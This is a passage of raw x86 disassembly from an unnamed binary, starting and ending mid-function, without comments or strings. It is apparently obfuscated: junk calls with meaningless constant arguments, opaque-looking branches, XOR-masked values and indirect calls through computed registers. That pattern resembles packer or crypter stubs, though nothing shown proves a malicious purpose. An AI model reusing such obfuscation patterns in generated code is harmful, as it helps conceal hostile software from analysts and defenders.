  415ab6:	add    esp,0x14
  415ab9:	xor    DWORD PTR [ebp-0x20],edi
  415abc:	sub    ebx,esi
  415abe:	push   0xe6929a00
  415ac3:	push   0x5a4d8800
  415ac8:	call   0x417c22
  415acd:	add    esp,0x8
  415ad0:	push   0x2d
  415ad2:	call   0x417eff
  415ad7:	add    esp,0x4
  415ada:	push   0x5a
  415adc:	push   0xfab50d00
  415ae1:	call   0x417eff
  415ae6:	add    esp,0x8
  415ae9:	sub    DWORD PTR [ebp-0x20],ebx
  415aec:	push   0xc8182d00
  415af1:	call   0x417ddd
  415af6:	add    esp,0x4
  415af9:	mov    eax,DWORD PTR ds:0x42b040
  415aff:	push   0x684b9900
  415b04:	push   0x62be7400
  415b09:	push   0x76
  415b0b:	push   0x2a
  415b0d:	push   0xffffffb3
  415b0f:	call   0x417eff
  415b14:	add    esp,0x14
  415b17:	mov    edi,DWORD PTR [ebp-0x20]
  415b1a:	push   0x25
  415b1c:	push   0x9a8e2c00
  415b21:	push   0xffffffe7
  415b23:	push   0xffffffd9
  415b25:	push   0x228ff100
  415b2a:	call   0x4177cb
  415b2f:	add    esp,0x14
  415b32:	add    edi,edi
  415b34:	call   0x4177cb
  415b39:	cmp    edi,DWORD PTR [ebp-0x2c]
  415b3c:	jne    0x415c0f
  415b42:	add    edi,eax
  415b44:	cmp    edi,DWORD PTR [ebp-0x4]
  415b47:	jne    0x415c0f
  415b4d:	push   0xffffff9a
  415b4f:	push   0x23
  415b51:	push   0x66
  415b53:	call   0x417ddd
  415b58:	add    esp,0xc
  415b5b:	push   0x9ec90c00
  415b60:	push   0x7a720100
  415b65:	push   0x86f78a00
  415b6a:	push   0x882c5400
  415b6f:	call   0x417eff
  415b74:	add    esp,0x10
  415b77:	push   0x33
  415b79:	push   0xf84dc100
  415b7e:	push   0xffffff91
  415b80:	push   0x82740200
  415b85:	call   0x4177cb
  415b8a:	add    esp,0x10
  415b8d:	push   0xcef77500
  415b92:	push   0xffffff92
  415b94:	push   0xffffffb9
  415b96:	push   0x8e8f9300
  415b9b:	push   0xffffffc8
  415b9d:	call   0x4177cb
  415ba2:	add    esp,0x14
  415ba5:	add    DWORD PTR [ebp-0x20],ebx
  415ba8:	push   0x8242f700
  415bad:	push   0x7a182700
  415bb2:	push   0x3ec0d300
  415bb7:	push   0x7eb77e00
  415bbc:	call   0x417c22
  415bc1:	add    esp,0x10
  415bc4:	cmp    edi,DWORD PTR ds:0x42b040
  415bca:	jne    0x415c0f
  415bcc:	push   0x4812de00
  415bd1:	push   0xffffff8e
  415bd3:	call   0x4177cb
  415bd8:	add    esp,0x8
  415bdb:	mov    ecx,0x962b
  415be0:	push   0x483c9200
  415be5:	push   0xffffff97
  415be7:	push   0x62dceb00
  415bec:	push   0x5a
  415bee:	call   0x417c22
  415bf3:	add    esp,0x10
  415bf6:	push   0xffffffbd
  415bf8:	push   0xffffff84
  415bfa:	push   0x6844af00
  415bff:	push   0x7a4d4800
  415c04:	call   0x41798a
  415c09:	add    esp,0x10
  415c0c:	sub    DWORD PTR [ebp-0x20],edi
  415c0f:	cmp    eax,0x60
  415c12:	je     0x415c24
  415c14:	mov    eax,DWORD PTR [ebp-0x20]
  415c17:	push   0x229a8100
  415c1c:	call   0x417ddd
  415c21:	add    esp,0x4
  415c24:	push   0x5f
  415c26:	call   0x417eff
  415c2b:	add    esp,0x4
  415c2e:	push   0xffffffd0
  415c30:	push   0x4f
  415c32:	push   0x51
  415c34:	call   0x417eff
  415c39:	add    esp,0xc
  415c3c:	push   0xffffffad
  415c3e:	push   0xffffffd7
  415c40:	push   0x36
  415c42:	push   0xf2b69700
  415c47:	call   0x417eff
  415c4c:	add    esp,0x10
  415c4f:	call   0x417eff
  415c54:	mov    ecx,DWORD PTR ds:0x42b078
  415c5a:	sub    DWORD PTR [ebp-0x20],ecx
  415c5d:	mov    ecx,DWORD PTR [ebp-0x20]
  415c60:	mov    ebx,DWORD PTR [ebp-0x20]
  415c63:	sub    ecx,edi
  415c65:	push   0x2327200
  415c6a:	call   0x417ddd
  415c6f:	add    esp,0x4
  415c72:	sub    ebx,edi
  415c74:	cmp    eax,0x58
  415c77:	je     0x415c96
  415c79:	push   0xffffff89
  415c7b:	push   0x11
  415c7d:	push   0xffffff8d
  415c7f:	push   0x1d
  415c81:	call   0x417ddd
  415c86:	add    esp,0x10
  415c89:	and    ebx,esi
  415c8b:	cmp    ebx,DWORD PTR ds:0x42b040
  415c91:	je     0x415c96
  415c93:	add    DWORD PTR [ebp-0x20],ebx
  415c96:	cmp    ebx,DWORD PTR ds:0x42b040
  415c9c:	je     0x415cb2
  415c9e:	cmp    eax,DWORD PTR [ebp-0x10]
  415ca1:	jne    0x415cb2
  415ca3:	push   0x52
  415ca5:	push   0xc27fac00
  415caa:	call   0x41798a
  415caf:	add    esp,0x8
  415cb2:	cmp    ebx,esi
  415cb4:	je     0x415cc0
  415cb6:	push   0x1d
  415cb8:	call   0x417ddd
  415cbd:	add    esp,0x4
  415cc0:	push   0xffffff9c
  415cc2:	push   0x423ed400
  415cc7:	push   0x51
  415cc9:	push   0x0
  415ccb:	push   0x42329400
  415cd0:	call   0x417eff
  415cd5:	add    esp,0x14
  415cd8:	mov    ebx,0xf2a9
  415cdd:	and    ebx,eax
  415cdf:	add    DWORD PTR [ebp-0x20],ebx
  415ce2:	push   0x2e905b00
  415ce7:	push   0x14
  415ce9:	push   0x58151c00
  415cee:	call   0x417c22
  415cf3:	add    esp,0xc
  415cf6:	push   0x86b66800
  415cfb:	push   0x421c9100
  415d00:	push   0x7690da00
  415d05:	push   0xffffffa1
  415d07:	push   0xffffffda
  415d09:	call   0x4177cb
  415d0e:	add    esp,0x14
  415d11:	push   0xe6c00800
  415d16:	call   0x4177cb
  415d1b:	add    esp,0x4
  415d1e:	mov    edx,DWORD PTR ds:0x42b040
  415d24:	push   0xffffffcb
  415d26:	push   0x68179200
  415d2b:	push   0x9eee3c00
  415d30:	push   0x62
  415d32:	push   0x2a
  415d34:	call   0x417ddd
  415d39:	add    esp,0x14
  415d3c:	push   0x60
  415d3e:	push   0xd2df0a00
  415d43:	push   0xc227f200
  415d48:	push   0x7a4bc200
  415d4d:	call   0x4177cb
  415d52:	add    esp,0x10
  415d55:	cmp    eax,DWORD PTR [ebp-0x1c]
  415d58:	je     0x415d70
  415d5a:	mov    ebx,DWORD PTR [ebp-0x20]
  415d5d:	xor    eax,eax
  415d5f:	push   0x23
  415d61:	push   0x75
  415d63:	call   0x41798a
  415d68:	add    esp,0x8
  415d6b:	sub    ebx,esi
  415d6d:	or     DWORD PTR [ebp-0x20],ebx
  415d70:	push   0xe6c3b100
  415d75:	push   0x4
  415d77:	call   0x4177cb
  415d7c:	add    esp,0x8
  415d7f:	push   0xffffff82
  415d81:	call   0x417c22
  415d86:	add    esp,0x4
  415d89:	mov    edi,0x42680424
  415d8e:	push   0x6
  415d90:	push   0xfa77b900
  415d95:	push   0xffffffee
  415d97:	push   0x3286f800
  415d9c:	push   0x70
  415d9e:	call   0x417c22
  415da3:	add    esp,0x14
  415da6:	push   0xea02c00
  415dab:	push   0x1eeaf400
  415db0:	call   0x41798a
  415db5:	add    esp,0x8
  415db8:	push   0x3c
  415dba:	push   0xfffffff1
  415dbc:	call   0x41798a
  415dc1:	add    esp,0x8
  415dc4:	push   0x31
  415dc6:	push   0xc6a38100
  415dcb:	push   0x72e31200
  415dd0:	call   0x417ddd
  415dd5:	add    esp,0xc
  415dd8:	push   0x1
  415dda:	push   0x6f
  415ddc:	push   0x18612200
  415de1:	push   0x78259000
  415de6:	call   0x41798a
  415deb:	add    esp,0x10
  415dee:	call   0x417c22
  415df3:	push   0x25
  415df5:	push   0x5a5dd800
  415dfa:	call   0x417eff
  415dff:	add    esp,0x8
  415e02:	cmp    ebx,DWORD PTR ds:0x42b078
  415e08:	je     0x415e0f
  415e0a:	add    ebx,esi
  415e0c:	add    DWORD PTR [ebp-0x20],ebx
  415e0f:	push   0x51
  415e11:	call   0x417eff
  415e16:	add    esp,0x4
  415e19:	push   0x32f17400
  415e1e:	call   0x417eff
  415e23:	add    esp,0x4
  415e26:	push   0x5
  415e28:	push   0x6c
  415e2a:	push   0xffffffa2
  415e2c:	call   0x417ddd
  415e31:	add    esp,0xc
  415e34:	add    DWORD PTR [ebp-0x20],edi
  415e37:	push   0x82130d00
  415e3c:	push   0x2503b00
  415e41:	push   0xffffffec
  415e43:	push   0xfffffffc
  415e45:	call   0x417eff
  415e4a:	add    esp,0x10
  415e4d:	lea    ecx,[ebp-0x28]
  415e50:	xor    ebx,ebx
  415e52:	add    ebx,esi
  415e54:	add    ebx,ebx
  415e56:	mov    eax,DWORD PTR [ebp-0x20]
  415e59:	cmp    ecx,DWORD PTR [ebp-0x14]
  415e5c:	je     0x415eb7
  415e5e:	sub    ebx,eax
  415e60:	cmp    ebx,DWORD PTR ds:0x42b040
  415e66:	je     0x415eb7
  415e68:	mov    esi,DWORD PTR [ebp-0x20]
  415e6b:	mov    edx,edi
  415e6d:	cmp    ecx,DWORD PTR [ebp-0x14]
  415e70:	je     0x415eb7
  415e72:	mov    edi,DWORD PTR [ebp-0x20]
  415e75:	and    edi,ecx
  415e77:	cmp    ecx,DWORD PTR [ebp-0x50]
  415e7a:	jne    0x415eb7
  415e7c:	mov    edx,DWORD PTR ds:0x42b078
  415e82:	and    ebx,ecx
  415e84:	add    DWORD PTR [ebp-0x20],ebx
  415e87:	add    edx,edi
  415e89:	cmp    esi,edx
  415e8b:	je     0x415eb7
  415e8d:	cmp    edx,DWORD PTR [ebp-0x1c]
  415e90:	je     0x415eb7
  415e92:	mov    eax,DWORD PTR [ebp-0x20]
  415e95:	mov    ebx,0x2194
  415e9a:	sub    ebx,ecx
  415e9c:	add    DWORD PTR [ebp-0x20],eax
  415e9f:	add    ebx,edx
  415ea1:	xor    DWORD PTR [ebp-0x20],esi
  415ea4:	cmp    eax,0x47
  415ea7:	je     0x415eb7
  415ea9:	cmp    ecx,edi
  415eab:	je     0x415eb7
  415ead:	cmp    esi,0xfffffff8
  415eb0:	jne    0x415eb7
  415eb2:	add    ebx,esi
  415eb4:	add    DWORD PTR [ebp-0x20],ebx
  415eb7:	mov    eax,DWORD PTR [ebp-0x20]
  415eba:	mov    edi,0xa5
  415ebf:	sub    DWORD PTR [ebp-0x20],eax
  415ec2:	sub    edi,esi
  415ec4:	sub    edi,esi
  415ec6:	sub    DWORD PTR [ebp-0x20],edi
  415ec9:	push   ecx
  415eca:	call   0x417c22
  415ecf:	push   0x5a09fc57
  415ed4:	push   0xffffffa3
  415ed6:	push   0x53
  415ed8:	push   0x5b
  415eda:	push   0xdefe4800
  415edf:	push   0xffffffc4
  415ee1:	call   0x41798a
  415ee6:	add    esp,0x14
  415ee9:	push   0x8ee42800
  415eee:	call   0x417ddd
  415ef3:	add    esp,0x4
  415ef6:	call   0x417eff
  415efb:	call   0x416273
  415f00:	cmp    ebx,esi
  415f02:	je     0x415f19
  415f04:	push   0xffffffa5
  415f06:	push   0xffffffbc
  415f08:	push   0xffffffa9
  415f0a:	push   0x5a7cfe00
  415f0f:	push   0x1b
  415f11:	call   0x417eff
  415f16:	add    esp,0x14
  415f19:	push   0x7b
  415f1b:	push   0x5816c600
  415f20:	push   0x207b600
  415f25:	push   0xffffffd7
  415f27:	call   0x41798a
  415f2c:	add    esp,0x10
  415f2f:	mov    ebx,DWORD PTR [ebp-0x28]
  415f32:	or     DWORD PTR [ebp-0x20],ebx
  415f35:	shr    ebx,0x10
  415f38:	push   0x229ffb00
  415f3d:	push   0xda9edb00
  415f42:	push   0x72
  415f44:	call   0x417eff
  415f49:	add    esp,0xc
  415f4c:	push   0x22bbae00
  415f51:	push   0xdac56c00
  415f56:	call   0x417ddd
  415f5b:	add    esp,0x8
  415f5e:	cmp    ebx,0x845a
  415f64:	jne    0x4161db
  415f6a:	and    eax,esi
  415f6c:	xor    edx,edx
  415f6e:	push   0xffffffec
  415f70:	push   0x88544200
  415f75:	push   0xffffffa0
  415f77:	push   0x2ae8d700
  415f7c:	call   0x417c22
  415f81:	add    esp,0x10
  415f84:	push   0x7a019000
  415f89:	call   0x417eff
  415f8e:	add    esp,0x4
  415f91:	mov    eax,0x849c595f
  415f96:	mov    ebx,DWORD PTR [ebp-0x20]
  415f99:	cmp    esi,edi
  415f9b:	je     0x415fed
  415f9d:	mov    ecx,0xa9
  415fa2:	mov    edi,DWORD PTR [ebp-0x20]
  415fa5:	cmp    edi,DWORD PTR [ebp-0x14]
  415fa8:	jne    0x415fed
  415faa:	add    DWORD PTR [ebp-0x20],ebx
  415fad:	sub    edi,eax
  415faf:	test   edi,0x6c40
  415fb5:	je     0x415fed
  415fb7:	mov    esi,DWORD PTR ds:0x42b040
  415fbd:	mov    ebx,DWORD PTR [ebp-0x20]
  415fc0:	test   ebx,0x1ffd
  415fc6:	jne    0x415fed
  415fc8:	mov    esi,0xb1
  415fcd:	xor    DWORD PTR [ebp-0x20],esi
  415fd0:	sub    edi,eax
  415fd2:	mov    edx,DWORD PTR ds:0x42b06c
  415fd8:	add    edi,ebx
  415fda:	test   edi,0xea
  415fe0:	jne    0x415fed
  415fe2:	add    DWORD PTR [ebp-0x20],edi
  415fe5:	sub    DWORD PTR [ebp-0x20],edx
  415fe8:	sub    ecx,eax
  415fea:	and    DWORD PTR [ebp-0x20],ecx
  415fed:	sub    eax,DWORD PTR [ebp-0x28]
  415ff0:	mov    edx,DWORD PTR [ebp-0x20]
  415ff3:	sub    edx,esi
  415ff5:	cmp    edx,DWORD PTR [ebp-0x24]
  415ff8:	je     0x415ffd
  415ffa:	and    DWORD PTR [ebp-0x20],edx
  415ffd:	call   eax
  415fff:	cmp    edi,DWORD PTR ds:0x42b040
  416005:	jne    0x41603c
  416007:	mov    edx,DWORD PTR [ebp-0x20]
  41600a:	sub    edx,esi
  41600c:	add    DWORD PTR [ebp-0x20],ebx
  41600f:	test   edx,0x9b
  416015:	je     0x41603c
  416017:	cmp    edx,0xa837
  41601d:	jne    0x41603c
  41601f:	sub    edx,esi
  416021:	mov    ecx,0x9f
  416026:	mov    edi,0xc5
  41602b:	sub    edx,eax
  41602d:	sub    ecx,esi
  41602f:	sub    DWORD PTR [ebp-0x20],edx
  416032:	or     ecx,eax
  416034:	sub    edi,eax
  416036:	sub    DWORD PTR [ebp-0x20],ecx
  416039:	and    DWORD PTR [ebp-0x20],edi
  41603c:	mov    DWORD PTR [ebp-0x18],eax
  41603f:	push   0x41
  416041:	push   0x63
  416043:	push   0x5a653700
  416048:	call   0x4177cb
  41604d:	add    esp,0xc
  416050:	mov    esi,0x416f37
  416055:	sub    ebx,eax
  416057:	mov    ecx,ebx
  416059:	or     ecx,ebx
  41605b:	mov    ebx,DWORD PTR [ebp-0x20]
  41605e:	call   0x417eff
  416063:	push   0x482fec00
  416068:	call   0x41798a
  41606d:	add    esp,0x4
  416070:	push   0xffffff9c
  416072:	push   0xd81fc300
  416077:	push   0xffffff91
  416079:	call   0x4177cb
  41607e:	add    esp,0xc
  416081:	push   0xffffffcf
  416083:	push   0x88332b00
  416088:	call   0x417ddd
  41608d:	add    esp,0x8
  416090:	add    DWORD PTR [ebp-0x20],esi
  416093:	push   0x82a0f000
  416098:	push   0x7aae6300
  41609d:	push   0x86592f00
  4160a2:	push   0xc88edc00
  4160a7:	call   0x417eff
  4160ac:	add    esp,0x10
  4160af:	push   0x2a0aaf00
  4160b4:	push   0xca28e800
  4160b9:	push   0x68ba2100
  4160be:	push   0xe8a6e700
  4160c3:	call   0x417ddd
  4160c8:	add    esp,0x10
  4160cb:	push   0xffffff9a
  4160cd:	push   0x6c
  4160cf:	push   0x8ee8500
  4160d4:	call   0x417ddd
  4160d9:	add    esp,0xc
  4160dc:	sub    DWORD PTR [ebp-0x20],ebx
  4160df:	push   0x88d2ae00
  4160e4:	push   0x16
  4160e6:	push   0x5e511500
  4160eb:	push   0x61
  4160ed:	push   0x36413100
  4160f2:	call   0x4177cb
  4160f7:	add    esp,0x14
  4160fa:	push   DWORD PTR [ebp-0x28]
  4160fd:	push   0x845c2ba3
  416102:	push   DWORD PTR [ebp-0x18]
  416105:	call   esi
  416107:	call   0x41798a
  41610c:	add    DWORD PTR [ebp-0x18],0x9
  416113:	mov    eax,DWORD PTR ds:0x42b040
  416119:	push   0x48
  41611b:	push   0xffffffef
  41611d:	push   0x98818e00
  416122:	push   0xffffffda
  416124:	call   0x417ddd
  416129:	add    esp,0x10
  41612c:	mov    ecx,DWORD PTR [ebp-0x18]
  41612f:	or     esi,edi
  416131:	mov    edi,0xf
  416136:	sub    esi,ecx
  416138:	mov    edx,DWORD PTR ds:0x42b078
  41613e:	cmp    esi,edx
  416140:	je     0x41618c
  416142:	sub    esi,edx
  416144:	xor    eax,eax
  416146:	mov    ebx,DWORD PTR [ebp-0x20]
  416149:	or     DWORD PTR [ebp-0x20],eax
  41614c:	add    ebx,ecx
  41614e:	sub    edi,eax
  416150:	add    esi,esi
  416152:	cmp    ebx,0x1b
  416155:	je     0x41618c
  416157:	add    DWORD PTR [ebp-0x20],ebx
  41615a:	sub    DWORD PTR [ebp-0x20],edi
  41615d:	mov    eax,edx
  41615f:	mov    ebx,0x5f
  416164:	add    DWORD PTR [ebp-0x20],edx
  416167:	add    eax,edx
  416169:	or     ebx,eax
  41616b:	and    ebx,edi
  41616d:	add    esi,edi
  41616f:	or     esi,eax
  416171:	or     DWORD PTR [ebp-0x20],ebx
  416174:	sub    DWORD PTR [ebp-0x20],edx
  416177:	test   esi,0x5bf6
  41617d:	je     0x41618c
  41617f:	mov    edx,DWORD PTR [ebp-0x20]
  416182:	mov    eax,DWORD PTR [ebp-0x20]
  416185:	sub    esi,edx
  416187:	add    eax,esi
  416189:	mov    DWORD PTR [ebp-0x20],eax
  41618c:	call   ecx
  41618e:	push   0x78a06600
  416193:	push   0x20
  416195:	push   0xa55e500
  41619a:	push   0x19
  41619c:	call   0x417ddd
  4161a1:	add    esp,0x10
  4161a4:	cmp    esi,0x4e45
  4161aa:	je     0x4161b3
  4161ac:	mov    edx,ebx
  4161ae:	call   0x4177cb
  4161b3:	push   0xffffffae
  4161b5:	push   0x2a5f4900
  4161ba:	call   0x417eff
  4161bf:	add    esp,0x8
  4161c2:	push   0xba053700
  4161c7:	push   0x50
  4161c9:	push   0xb8a1e700
  4161ce:	push   0x488ec600
  4161d3:	call   0x4177cb
  4161d8:	add    esp,0x10
  4161db:	push   0xffffffc2
  4161dd:	call   0x4177cb
  4161e2:	add    esp,0x4
  4161e5:	push   0xb8923c00
  4161ea:	push   0x4d
  4161ec:	push   0xffffffab
  4161ee:	call   0x417eff
  4161f3:	add    esp,0xc
  4161f6:	push   0x28dac300
  4161fb:	push   0x4d
  4161fd:	call   0x4177cb
  416202:	add    esp,0x8
  416205:	push   0xffffffda
  416207:	push   0x78b3f900
  41620c:	push   0x4297ad00
  416211:	call   0x417eff
  416216:	add    esp,0xc
  416219:	push   0xaa591800
  41621e:	push   0xd8d6aa00
  416223:	call   0x41798a
  416228:	add    esp,0x8
  41622b:	push   0xfabdf500
  416230:	push   0xfe0ab800
  416235:	push   0x6243500
  41623a:	push   0x1d
  41623c:	call   0x417c22
  416241:	add    esp,0x10
  416244:	pop    edi
  416245:	and    DWORD PTR [ebp-0x20],eax
  416248:	pop    esi
  416249:	or     DWORD PTR [ebp-0x20],eax
  41624c:	pop    ebx
  41624d:	sub    eax,ebx
  41624f:	push   0x38e28200
  416254:	call   0x417ddd
  416259:	add    esp,0x4
  41625c:	push   0x33
  41625e:	push   0xffffff95
  416260:	push   0xffffffd4
  416262:	push   0x11
  416264:	call   0x417ddd
  416269:	add    esp,0x10
  41626c:	leave  
  41626d:	ret    
  41626e:	int3   
  41626f:	int3   
  416270:	int3   
  416271:	int3   
  416272:	int3   
  416273:	push   ebp
  416274:	mov    ebp,esp
  416276:	sub    esp,0x54
  416279:	push   0xc2e8fb00
  41627e:	push   0xffffffb5
  416280:	push   0xf27d3100
  416285:	push   0x2e
  416287:	push   0x18b6a200
  41628c:	call   0x417c22
  416291:	add    esp,0x14
  416294:	push   0xffffffed
  416296:	push   0xa673fe00
  41629b:	call   0x417c22
  4162a0:	add    esp,0x8
  4162a3:	push   ebx
  4162a4:	push   0x5ae48800
  4162a9:	push   0x58
  4162ab:	push   0x7e
  4162ad:	push   0x7d
  4162af:	push   0x72566a00
  4162b4:	call   0x41798a
  4162b9:	add    esp,0x14
  4162bc:	push   0xde3a5c00
  4162c1:	push   0x38e33400
  4162c6:	push   0x28f48000
  4162cb:	call   0x417ddd
  4162d0:	add    esp,0xc
  4162d3:	push   esi
  4162d4:	push   0x2a125b00
  4162d9:	push   0xc
  4162db:	push   0xf8ba5200
  4162e0:	push   0x6e215300
  4162e5:	push   0x28bbf00
  4162ea:	call   0x4177cb
  4162ef:	add    esp,0x14
  4162f2:	push   0xffffff93
  4162f4:	push   0xffffff8a
  4162f6:	push   0x48
  4162f8:	call   0x41798a
  4162fd:	add    esp,0xc
  416300:	push   edi
  416301:	push   0x9233af00
  416306:	push   0xffffff8c
  416308:	push   0xffffffa2
  41630a:	call   0x417eff
  41630f:	add    esp,0xc
  416312:	push   0xa0ef900
  416317:	push   0xe2761e00
  41631c:	call   0x41798a
  416321:	add    esp,0x8
  416324:	mov    edi,0xf5
  416329:	mov    esi,0xac06
  41632e:	push   0x5a8ca000
  416333:	push   0xf883d700
  416338:	push   0x62
  41633a:	call   0x417ddd
  41633f:	add    esp,0xc
  416342:	mov    DWORD PTR [ebp-0x1c],edi
  416345:	sub    DWORD PTR [ebp-0x1c],esi
  416348:	mov    DWORD PTR [ebp-0x54],0x36b74e72
  41634f:	push   0x9899d700
  416354:	push   0x56413600
  416359:	push   0xffffff98
  41635b:	push   0x58c0ee00
  416360:	push   0x6e70c900
  416365:	call   0x41798a
  41636a:	add    esp,0x14
  41636d:	call   0x416c65
  416372:	sub    DWORD PTR [ebp-0x1c],eax
  416375:	mov    DWORD PTR [ebp-0x3c],eax
  416378:	add    esi,eax
  41637a:	push   0x12
  41637c:	push   0x21
  41637e:	push   0x0
  416380:	push   0xfffffff9
  416382:	call   0x4177cb
  416387:	add    esp,0x10
  41638a:	push   0xffffff93
  41638c:	push   0x5acf0e00
  416391:	push   0x5b
  416393:	push   0xc
  416395:	push   0xffffff96
  416397:	call   0x417c22
  41639c:	add    esp,0x14
  41639f:	push   0xffffff9b
  4163a1:	call   0x417ddd
  4163a6:	add    esp,0x4
  4163a9:	push   0x73
  4163ab:	push   0x98810000
  4163b0:	push   0x82f07d00
  4163b5:	call   0x417c22
  4163ba:	add    esp,0xc
  4163bd:	push   0xf2502600
  4163c2:	push   0x6e6b4500
  4163c7:	call   0x417c22
  4163cc:	add    esp,0x8
  4163cf:	push   0xfa892400
  4163d4:	push   0x5a961400
  4163d9:	push   0x4e57b200
  4163de:	push   0x2d
  4163e0:	push   0xf8c70200
  4163e5:	call   0x417ddd
  4163ea:	add    esp,0x14
  4163ed:	push   0xb
  4163ef:	push   0xffffffd7
  4163f1:	push   0xc8ab7700
  4163f6:	push   0x6b
  4163f8:	push   0xe24f7c00
  4163fd:	call   0x4177cb
  416402:	add    esp,0x14
  416405:	cmp    eax,0x1e
  416408:	jne    0x416464
  41640a:	push   0xffffffb9
  41640c:	push   0xffffffb5
  41640e:	call   0x417eff
  416413:	add    esp,0x8
  416416:	push   0x98b80000
  41641b:	push   0x3218b400
  416420:	push   0xb
  416422:	push   0x37
  416424:	push   0xda59b200
  416429:	call   0x41798a
  41642e:	add    esp,0x14
  416431:	call   0x417eff
  416436:	push   0xb22fce00
  41643b:	push   0x42df9000
  416440:	push   0xffffffa0
  416442:	push   0x4e28cf00
  416447:	push   0x262f8000
  41644c:	call   0x4177cb
  416451:	add    esp,0x14
  416454:	push   0x88ee8c00
  416459:	call   0x4177cb
  41645e:	add    esp,0x4
  416461:	sub    DWORD PTR [ebp-0x1c],esi
  416464:	push   0xffffffb9
  416466:	push   0xaa7a3a00
  41646b:	push   0xee053700
  416470:	call   0x4177cb
  416475:	add    esp,0xc
  416478:	call   0x416c65
  41647d:	add    edi,eax
  41647f:	cmp    edi,0x5d
  416482:	jne    0x41649e
  416484:	mov    esi,DWORD PTR [ebp-0x1c]
  416487:	add    esi,esi
  416489:	mov    ecx,DWORD PTR [ebp-0x1c]
  41648c:	add    ecx,ecx
  41648e:	add    edi,ecx
  416490:	cmp    esi,DWORD PTR ds:0x42b054
  416496:	jne    0x41649e
  416498:	mov    DWORD PTR [ebp-0x1c],edi
  41649b:	xor    DWORD PTR [ebp-0x1c],esi
  41649e:	mov    DWORD PTR [ebp-0x50],eax
  4164a1:	push   0x8219f100
  4164a6:	call   0x417c22
  4164ab:	add    esp,0x4
  4164ae:	call   0x416c65
  4164b3:	mov    ebx,DWORD PTR [ebp-0x1c]
  4164b6:	mov    esi,DWORD PTR [ebp-0x1c]
  4164b9:	cmp    esi,DWORD PTR [ebp-0x48]
  4164bc:	jne    0x41655f
  4164c2:	mov    edi,eax
  4164c4:	mov    ecx,DWORD PTR [ebp-0x1c]
  4164c7:	cmp    ebx,0xffffffed
  4164ca:	jne    0x41655f
  4164d0:	test   ebx,0xf044
  4164d6:	je     0x41655f
  4164dc:	mov    edx,0x9d
  4164e1:	sub    ecx,edx
  4164e3:	mov    edx,DWORD PTR ds:0x42b054
  4164e9:	add    DWORD PTR [ebp-0x1c],ecx
  4164ec:	add    DWORD PTR [ebp-0x1c],edi
  4164ef:	cmp    ebx,0x576c
  4164f5:	jne    0x41655f
  4164f7:	cmp    ebx,0x3
  4164fa:	je     0x41655f
  4164fc:	mov    edx,0xb8c4
  416501:	mov    edi,0x38
  416506:	add    esi,edi
  416508:	test   ebx,0x49
  41650e:	jne    0x41655f
  416510:	add    DWORD PTR [ebp-0x1c],ebx
  416513:	mov    ebx,DWORD PTR ds:0x42b054
  416519:	cmp    eax,DWORD PTR ds:0x42b054
  41651f:	jne    0x41655f
  416521:	add    DWORD PTR [ebp-0x1c],esi
  416524:	and    edx,eax
  416526:	and    edx,eax
  416528:	mov    esi,DWORD PTR ds:0x42b054
  41652e:	or     edx,eax
  416530:	add    ebx,edx
  416532:	mov    ecx,DWORD PTR ds:0x42b044
  416538:	mov    DWORD PTR [ebp-0x1c],ecx
  41653b:	add    DWORD PTR [ebp-0x1c],ebx
  41653e:	sub    esi,ebx
  416540:	test   edx,0xf6
  416546:	je     0x41655f
  416548:	or     esi,ecx
  41654a:	add    esi,esi
  41654c:	mov    edx,0xe4
  416551:	add    edx,edi
  416553:	sub    DWORD PTR [ebp-0x1c],edx
  416556:	cmp    esi,eax
  416558:	je     0x41655f
  41655a:	add    esi,eax
  41655c:	add    DWORD PTR [ebp-0x1c],esi
  41655f:	mov    DWORD PTR [ebp-0x18],eax
  416562:	push   0xb
  416564:	call   0x417eff
  416569:	add    esp,0x4
  41656c:	mov    edi,DWORD PTR [ebp-0x50]
  41656f:	push   0x5af76400
  416574:	call   0x417eff
  416579:	add    esp,0x4
  41657c:	push   0xffffffa3
  41657e:	push   0x46
  416580:	call   0x41798a
  416585:	add    esp,0x8
  416588:	sub    edi,DWORD PTR [ebp-0x3c]
  41658b:	mov    edx,DWORD PTR ds:0x42b054
  416591:	cmp    edi,DWORD PTR [ebp-0x48]
  416594:	je     0x41659b
  416596:	sub    edx,edi
  416598:	add    DWORD PTR [ebp-0x1c],edx
  41659b:	push   0x7aa40200
  4165a0:	push   0x43
  4165a2:	call   0x417eff
  4165a7:	add    esp,0x8
  4165aa:	xor    edi,0xe800359e
  4165b0:	add    eax,eax
  4165b2:	cmp    edi,DWORD PTR [ebp-0x38]
  4165b5:	je     0x4165c9
  4165b7:	cmp    edi,DWORD PTR [ebp-0x24]
  4165ba:	jne    0x4165c9
  4165bc:	push   0x962dea00
  4165c1:	call   0x417ddd
  4165c6:	add    esp,0x4
  4165c9:	push   0xee476100
  4165ce:	push   0x7f
  4165d0:	push   0xffffff95
  4165d2:	call   0x41798a
  4165d7:	add    esp,0xc
  4165da:	mov    eax,DWORD PTR [ebp-0x18]
  4165dd:	cmp    eax,ebx
  4165df:	jne    0x416631
  4165e1:	mov    ebx,DWORD PTR [ebp-0x1c]
  4165e4:	cmp    eax,0xffffff98
  4165e7:	je     0x416631
  4165e9:	cmp    eax,edi
  4165eb:	je     0x416631
  4165ed:	mov    edx,eax
  4165ef:	sub    ebx,edi
  4165f1:	xor    esi,esi
  4165f3:	add    ebx,ebx
  4165f5:	sub    DWORD PTR [ebp-0x1c],ebx
  4165f8:	add    esi,edx
  4165fa:	and    esi,edx
  4165fc:	add    esi,edi
  4165fe:	cmp    edx,esi
  416600:	jne    0x416631
  416602:	sub    esi,eax
  416604:	mov    ebx,DWORD PTR [ebp-0x1c]
  416607:	mov    edx,DWORD PTR [ebp-0x1c]
  41660a:	sub    DWORD PTR [ebp-0x1c],ebx
  41660d:	test   esi,0x208d
  416613:	jne    0x416631
  416615:	sub    esi,edi
  416617:	mov    ebx,DWORD PTR [ebp-0x1c]
  41661a:	sub    ebx,edi
  41661c:	xor    ecx,ecx
  41661e:	sub    DWORD PTR [ebp-0x1c],edx
  416621:	sub    esi,ecx
  416623:	add    DWORD PTR [ebp-0x1c],ebx
  416626:	or     esi,ecx
  416628:	and    esi,ebx
  41662a:	sub    esi,edx
  41662c:	and    esi,ecx
  41662e:	sub    DWORD PTR [ebp-0x1c],esi
  416631:	sub    eax,DWORD PTR [ebp-0x50]
  416634:	add    DWORD PTR [ebp-0x1c],eax
  416637:	xor    eax,0xe800359b
  41663c:	mov    edx,DWORD PTR [ebp-0x1c]
  41663f:	mov    DWORD PTR [ebp-0x4c],eax
  416642:	mov    ecx,esi
  416644:	cmp    eax,0xf64b
